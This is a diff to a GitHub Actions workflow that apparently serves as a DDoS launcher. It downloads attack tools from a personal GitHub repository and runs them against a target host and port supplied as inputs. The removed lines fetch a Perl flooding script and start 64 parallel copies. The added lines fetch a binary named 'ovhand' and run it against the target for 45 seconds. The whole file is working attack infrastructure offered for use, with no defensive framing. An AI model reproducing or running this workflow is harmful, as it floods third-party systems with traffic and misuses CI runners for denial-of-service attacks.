@@ -1,4 +1,4 @@
-name: Tekil2 !
+name: OVH !
 
 on:
   workflow_dispatch:
@@ -29,20 +29,12 @@ jobs:
           TARGET="${{ inputs.target }}"
           PORT="${{ inputs.port }}"
           
-          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/hoplatici.pl -O Hoplatici.pl
-          chmod +x Hoplatici.pl || true
-
-          PIDS=()
-          for i in {1..64}; do
-            sudo timeout 30 perl Hoplatici.pl "$TARGET" "$PORT" 1400 30 &
-            PIDS+=($!)
-          done
-
-          for pid in "${PIDS[@]}"; do
-            wait $pid
-          done
-
+          wget https://github.com/AhmetKesser/Deneme/raw/refs/heads/main/ovhand -O OVH
+          chmod +x OVH || true
+          
+          sudo timeout 45 ./OVH "$TARGET" "$PORT" 4 45 &
+          
       - name: Finish !
         run: |
-          sleep 30
+          sleep 45
           exit 0
